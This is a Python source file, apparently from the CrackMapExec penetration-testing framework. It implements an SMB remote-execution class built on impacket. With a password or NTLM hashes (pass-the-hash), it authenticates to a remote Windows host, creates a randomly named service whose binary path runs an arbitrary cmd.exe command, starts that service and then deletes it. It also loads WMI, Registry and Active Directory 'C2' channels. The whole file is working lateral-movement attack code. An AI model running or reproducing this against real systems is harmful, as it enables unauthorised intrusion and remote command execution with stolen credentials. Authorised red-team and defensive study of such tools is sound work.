import logging
import inspect
from gevent import sleep
from cme.protocols.smb.c2s import *
from cme.helpers.misc import gen_random_string
from impacket.dcerpc.v5 import transport, scmr


class SMBEXEC(object):
    def __init__(self, connection, command, payload, target, username, password, domain, hashes=None, retOutput=True, port=445):
        self.connection = connection
        self.command = command
        self.payload = payload
        self.target = target
        self.port = port
        self.username = username
        self.password = password
        self.serviceName = gen_random_string()
        self.domain = domain
        self.lmhash = ''
        self.nthash = ''
        self.retOutput = retOutput
        self.outputBuffer = ''
        self.shell = '%COMSPEC% /Q /C '
        self.rpctransport = None
        self.scmr = None
        self.conn = None
        #self.mode  = mode
        self.aesKey = None
        self.doKerberos = False

        if hashes is not None:
        #This checks to see if we didn't provide the LM Hash
            if hashes.find(':') != -1:
                self.lmhash, self.nthash = hashes.split(':')
            else:
                self.nthash = hashes

        if self.password is None:
            self.password = ''

        stringbinding = 'ncacn_np:%s[\pipe\svcctl]' % self.target
        logging.debug('StringBinding {}'.format(stringbinding))
        self.rpctransport = transport.DCERPCTransportFactory(stringbinding)
        self.rpctransport.set_dport(self.port)

        if hasattr(self.rpctransport, 'setRemoteHost'):
            self.rpctransport.setRemoteHost(self.target)
        if hasattr(self.rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            self.rpctransport.set_credentials(self.username, self.password, self.domain, self.lmhash, self.nthash)
        #rpctransport.set_kerberos(self.doKerberos, self.kdcHost)

        self.scmr = self.rpctransport.get_dce_rpc()
        self.scmr.connect()

        self.scmr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(self.scmr)
        self.scHandle = resp['lpScHandle']

        # https://stackoverflow.com/questions/44352/iterate-over-subclasses-of-a-given-class-in-a-given-module
        for k, obj in inspect.getmembers(self):
            if hasattr(obj, "__bases__"):
                for cls in obj.__bases__:
                    if cls.__name__ == 'WMI':
                        logging.debug('Using WMI C2')
                        WMI.__init__(self)

                    elif cls.__name__ == 'Registry':
                        logging.debug('Using Registry C2')
                        Registry.__init__(self, self.connection)

                    elif cls.__name__ == 'ADProperty':
                        logging.debug('Using ADProperty C2')
                        ADProperty.__init__(self)

    def execute_command(self, data):

        command = self.shell + data

        logging.debug('Command to execute: ' + command)

        resp = scmr.hRCreateServiceW(self.scmr, self.scHandle, self.serviceName, self.serviceName, lpBinaryPathName=command, dwStartType=scmr.SERVICE_DEMAND_START)
        logging.debug('Remote service {} created.'.format(self.serviceName))
        service = resp['lpServiceHandle']

        while True:
            try:
                scmr.hRStartServiceW(self.scmr, service)
                logging.debug('Remote service {} started.'.format(self.serviceName))
                break
            except Exception as e:
                if str(e).find("ERROR_SERVICE_REQUEST_TIMEOUT") != -1:
                    logging.debug('Remote service {} started.'.format(self.serviceName))
                    break
                else:
                    logging.debug('Failed to start remote service {}: {}'.format(self.serviceName, e))
                    sleep(4)

        try:
            self.scmr = self.rpctransport.get_dce_rpc()
            self.scmr.connect()
            self.scmr.bind(scmr.MSRPC_UUID_SCMR)
            resp = scmr.hROpenSCManagerW(self.scmr)
            self.scHandle = resp['lpScHandle']
            resp = scmr.hROpenServiceW(self.scmr, self.scHandle, self.serviceName)
            service = resp['lpServiceHandle']
            scmr.hRDeleteService(self.scmr, service)
            logging.debug('Remote service {} deleted.'.format(self.serviceName))
            #scmr.hRControlService(self.scmr, service, scmr.SERVICE_CONTROL_STOP)
            scmr.hRCloseServiceHandle(self.scmr, service)
        except Exception as e:
            logging.debug("Error deleting service {}: {}".format(self.serviceName, e))
